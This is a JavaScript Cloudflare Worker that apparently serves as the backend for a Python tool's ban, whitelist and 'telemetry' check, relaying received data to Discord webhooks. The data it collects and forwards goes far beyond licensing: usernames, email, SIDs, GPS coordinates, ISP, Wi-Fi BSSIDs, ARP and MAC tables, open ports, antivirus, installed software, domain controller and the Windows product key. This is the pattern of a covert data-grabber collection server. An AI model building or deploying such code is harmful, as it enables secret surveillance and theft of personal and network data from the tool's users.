export default {
  async fetch(request, env) {
    const DISCORD_WEBHOOK_URL = env.DISCORD_WEBHOOK_URL;
    const DISCORD_BAN_WEBHOOK_URL = env.DISCORD_BAN_WEBHOOK_URL;
    const DISCORD_WHITELIST_WEBHOOK_URL = env.DISCORD_WHITELIST_WEBHOOK_URL;
    const ADMIN_TOKEN = env.ADMIN_TOKEN;
    
    const url = new URL(request.url);
    const machineId = url.searchParams.get("id");
    const rawData = url.searchParams.get("data");
    
    let telemetry = {};
    try {
      telemetry = JSON.parse(rawData || "{}");
    } catch (e) {
      telemetry = { error: "Failed to parse telemetry JSON" };
    }

    const ip = request.headers.get("CF-Connecting-IP") || "Unknown";
    const country = request.headers.get("CF-IPCountry") || "Unknown";
    const city = request.headers.get("CF-IPCity") || "Unknown";
    const colo = request.headers.get("CF-Ray") ? request.headers.get("CF-Ray").split('-')[1] : "Unknown";

    if (!ADMIN_TOKEN) {
      return new Response(JSON.stringify({ error: "Admin token not configured" }), { status: 500 });
    }

    if (url.pathname === "/admin") {
      const authHeader = request.headers.get("X-Admin-Token");
      if (authHeader !== ADMIN_TOKEN) {
        return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401 });
      }

      const body = await request.json().catch(() => ({}));
      const command = body.command || url.searchParams.get("command");
      const targetUuid = body.machine_uuid || url.searchParams.get("machine_uuid");

      if (!command || !targetUuid) {
        return new Response(JSON.stringify({ error: "Missing command or machine_uuid" }), { status: 400 });
      }

      if (!env.BLACKLIST_KV) {
        return new Response(JSON.stringify({ error: "KV not bound" }), { status: 500 });
      }

      if (command === "ban") {
        await env.BLACKLIST_KV.put(targetUuid, JSON.stringify({
          banned_at: new Date().toISOString(),
          reason: body.reason || "Banned by admin"
        }));
        return new Response(JSON.stringify({ status: "banned", machine_uuid: targetUuid }));
      }

      if (command === "unban") {
        await env.BLACKLIST_KV.delete(targetUuid);
        return new Response(JSON.stringify({ status: "unbanned", machine_uuid: targetUuid }));
      }

      if (command === "list") {
        const allKeys = await env.BLACKLIST_KV.list();
        const banned = [];
        for (const key of allKeys.keys) {
          try {
            const data = JSON.parse(key.value || "{}");
            banned.push({ uuid: key.name, ...data });
          } catch (e) {
            banned.push({ uuid: key.name, value: key.value });
          }
        }
        return new Response(JSON.stringify({ status: "ok", banned }));
      }

      if (command === "whitelist") {
        if (!env.WHITELIST_KV) {
          return new Response(JSON.stringify({ error: "Whitelist KV not bound" }), { status: 500 });
        }
        await env.WHITELIST_KV.put(targetUuid, "true");
        return new Response(JSON.stringify({ status: "whitelisted", machine_uuid: targetUuid }));
      }

      if (command === "unwhitelist") {
        if (!env.WHITELIST_KV) {
          return new Response(JSON.stringify({ error: "Whitelist KV not bound" }), { status: 500 });
        }
        await env.WHITELIST_KV.delete(targetUuid);
        return new Response(JSON.stringify({ status: "unwhitelisted", machine_uuid: targetUuid }));
      }

      if (command === "list_whitelist") {
        if (!env.WHITELIST_KV) {
          return new Response(JSON.stringify({ error: "Whitelist KV not bound" }), { status: 500 });
        }
        const allKeys = await env.WHITELIST_KV.list();
        const whitelisted = allKeys.keys.map(key => ({ uuid: key.name }));
        return new Response(JSON.stringify({ status: "ok", whitelisted }));
      }

      return new Response(JSON.stringify({ error: "Unknown command" }), { status: 400 });
    }

    if (!machineId || !env.BLACKLIST_KV) {
      return new Response(JSON.stringify({ banned: false }), {
        headers: { "Content-Type": "application/json" }
      });
    }

    const hasTelemetry = telemetry && Object.keys(telemetry).length > 0 && !telemetry.error;
    if (!hasTelemetry) {
      return new Response(JSON.stringify({ banned: false }), {
        headers: { "Content-Type": "application/json" }
      });
    }

    if (env.WHITELIST_KV && await env.WHITELIST_KV.get(machineId)) {
      if (DISCORD_WHITELIST_WEBHOOK_URL) {
        const publicIp = telemetry.public_ip || ip;
        const privateIp = telemetry.local_ip || "N/A";
        const desktopName = telemetry.hostname || "N/A";
        const hwid = machineId;

        const whitelistPayload = {
          content: `\`\`\`\n${publicIp}\n${privateIp}\n${desktopName}\n${hwid}\nuser successfully whitelisted!\`\`\``
        };

        try {
          await fetch(DISCORD_WHITELIST_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(whitelistPayload)
          });
        } catch (err) {
          console.error("Failed to post to Whitelist webhook:", err);
        }
      }

      return new Response(JSON.stringify({ banned: false }), {
        headers: { "Content-Type": "application/json" }
      });
    }

    const banInfo = await env.BLACKLIST_KV.get(machineId, { type: "json" });
    if (banInfo) {
      const publicIp = telemetry.public_ip || ip;
      const privateIp = telemetry.local_ip || "N/A";
      const desktopName = telemetry.hostname || "N/A";
      const hwid = machineId;

      const banPayload = {
        content: `\`\`\`\n${publicIp}\n${privateIp}\n${desktopName}\n${hwid}\nuser successfully banned!\`\`\``
      };

      try {
        await fetch(DISCORD_BAN_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(banPayload)
        });
      } catch (err) {
        console.error("Failed to post to Ban webhook:", err);
      }

      return new Response(JSON.stringify({ 
        banned: true, 
        reason: banInfo.reason || "Unauthorized access" 
      }), {
        headers: { "Content-Type": "application/json" }
      });
    }

    const systemUptime = telemetry.uptime && typeof telemetry.uptime === 'object' 
      ? `${telemetry.uptime.uptime_seconds || 'N/A'}s` 
      : 'N/A';

    const trunc = (val, maxLen = 120) => {
      if (val == null) return "N/A";
      const s = typeof val === 'string' ? val : JSON.stringify(val);
      return s.length > maxLen ? s.slice(0, maxLen) + "..." : s;
    };

    const allIps = (telemetry.all_interface_ips || []).slice(0, 3).map(i => `${i.name}: ${(i.ips || []).slice(0, 2).join(", ")}`).join("\n") || "N/A";
    const allMacs = (telemetry.all_mac_addresses || []).slice(0, 3).map(m => `${m.interface}: ${m.mac}`).join("\n") || "N/A";
    const arpSummary = (telemetry.arp_table || []).slice(0, 4).map(e => `${e.ip} -> ${e.mac}`).join("\n") || "N/A";
    const listeningPorts = (telemetry.listening_ports || []).slice(0, 6).map(p => `${p.port} (${p.process})`).join(", ") || "None";
    const installedSoftware = (telemetry.installed_software || []).slice(0, 6).join(", ") || "N/A";
    const antivirusList = (telemetry.antivirus || []).slice(0, 3).join(", ") || "None detected";
    const diskDrives = (telemetry.disk_drives || []).slice(0, 3).map(d => `${d.device} ${d.total_gb}GB`).join(", ") || "N/A";
    const monitors = (telemetry.monitor_edid || []).slice(0, 2).join(", ") || "N/A";
    const connectedDevices = (telemetry.connected_devices || []).slice(0, 4).join(", ") || "N/A";
    const systemLanguage = (telemetry.system_language || []).slice(0, 2).join(", ") || "N/A";

    const discordPayload = {
      embeds: [{
        title: `🚀 Telemetry Log: ${telemetry.app_name || "Tool"}`,
        color: 3066993,
        fields: [
          { name: "👤 User Identity", value: trunc(`User: ${telemetry.username || "N/A"}\nEmail: ${telemetry.primary_email || "N/A"}\nDomain: ${telemetry.domain || "N/A"}\nSID: ${telemetry.user_sid || "N/A"}`, 180), inline: true },
          { name: "💻 Machine UUID", value: trunc(machineId || "N/A", 80), inline: true },
          { name: "🌐 Public IP", value: trunc(`IP: ${telemetry.public_ip || ip}\nISP: ${telemetry.isp || "N/A"}\nASN: ${telemetry.asn || "N/A"}\nZip: ${telemetry.zip || "N/A"}`, 200), inline: true },
          { name: "📍 Location", value: trunc(`${telemetry.city || "N/A"}, ${telemetry.country || "N/A"}\nCoords: ${telemetry.coordinates || "N/A"}\nTZ: ${telemetry.timezone || "N/A"}`, 200), inline: true },
          { name: "🏠 Local Network", value: trunc(`Local IP: ${telemetry.local_ip || "N/A"}\nRouter MAC: ${telemetry.router_gateway_mac || "N/A"}\n${allIps}`, 220), inline: false },
          { name: "🖧 MAC Table", value: trunc(allMacs, 220), inline: false },
          { name: "🔍 DNS & Routing", value: trunc(`Reverse DNS: ${telemetry.reverse_dns || "N/A"}\nDoH: ${(telemetry.doh_resolved_ips || []).join(", ") || "None"}`, 200), inline: true },
          { name: "🔌 Ports", value: trunc(`Listening: ${listeningPorts}\nOpen: ${(telemetry.open_ports || []).join(", ") || "None"}`, 200), inline: true },
          { name: "🛡️ Security", value: trunc(`VPN: ${telemetry.vpn_detected ? "Yes" : "No"}\nProxy: ${telemetry.proxy ? "Yes" : "No"}\nAV: ${antivirusList}`, 200), inline: true },
          { name: "📡 Wi-Fi BSSIDs", value: trunc((telemetry.wifi_bssids || []).slice(0, 3).join(", ") || "N/A", 120), inline: true },
          { name: "🖧 ARP Neighbors", value: trunc(arpSummary, 220), inline: false },
          { name: "⚙️ OS/CPU", value: trunc(`${telemetry.os_name || "N/A"} ${telemetry.os_release || ""} (${telemetry.architecture || "N/A"}) / ${telemetry.processor || "N/A"} / Cores: ${telemetry.cpu_count || "N/A"}`, 160), inline: true },
          { name: "💾 RAM/GPU", value: trunc(`RAM: ${telemetry.memory_total ? Math.round(parseInt(telemetry.memory_total) / 1024 / 1024 / 1024) + " GB" : "N/A"} / GPU: ${telemetry.gpu_info || "N/A"}`, 120), inline: true },
          { name: "⏱️ Uptime", value: trunc(systemUptime, 80), inline: true },
          { name: "📋 Registered Owner", value: trunc(`${telemetry.registered_owner?.owner || "N/A"}\nOrg: ${telemetry.registered_owner?.organization || "N/A"}`, 120), inline: true },
          { name: "🔑 Product Key", value: trunc(`${telemetry.system_product_key || "N/A"}\nActivation: ${telemetry.windows_activation || "N/A"}`, 120), inline: true },
          { name: "🌐 Domain Controller", value: trunc(telemetry.domain_controller || "N/A", 120), inline: false },
          { name: "⌨️ System Language", value: trunc(systemLanguage, 120), inline: true },
          { name: "📱 Connected Devices", value: trunc(connectedDevices, 150), inline: false },
          { name: "🖵 Monitors", value: trunc(monitors, 120), inline: true },
          { name: "💾 Disk Drives", value: trunc(diskDrives, 150), inline: false },
          { name: "📂 User Paths", value: trunc(`Desktop: ${(telemetry.user_paths || {}).desktop || "N/A"}\nDownloads: ${(telemetry.user_paths || {}).downloads || "N/A"}`, 150), inline: true },
          { name: "🌐 Default Browser", value: trunc(telemetry.default_browser || "N/A", 80), inline: true },
          { name: "📦 Software", value: trunc(installedSoftware, 220), inline: false },
          { name: "📦 App", value: trunc(`v${telemetry.app_version || "1.0.0"} / Python ${telemetry.python_version || "N/A"} / ${telemetry.timestamp || "Just now"}`, 120), inline: true }
        ],
        footer: {
          text: `Edge: ${colo} | Security Active`
        }
      }]
    };

    console.log("WEBHOOK_URL present:", !!DISCORD_WEBHOOK_URL);
    console.log("BAN_WEBHOOK_URL present:", !!DISCORD_BAN_WEBHOOK_URL);
    console.log("Payload fields:", discordPayload.embeds[0].fields.length);
    console.log("Payload size:", JSON.stringify(discordPayload).length);

    try {
      const discordResp = await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(discordPayload)
      });
      console.log("Discord webhook response:", discordResp.status);
      const respText = await discordResp.text().catch(() => "");
      console.log("Discord webhook body:", respText.slice(0, 200));
    } catch (err) {
      console.error("Failed to post to Discord webhook:", err);
    }

    return new Response(JSON.stringify({ banned: false }), {
      headers: { "Content-Type": "application/json" }
    });
  }
};
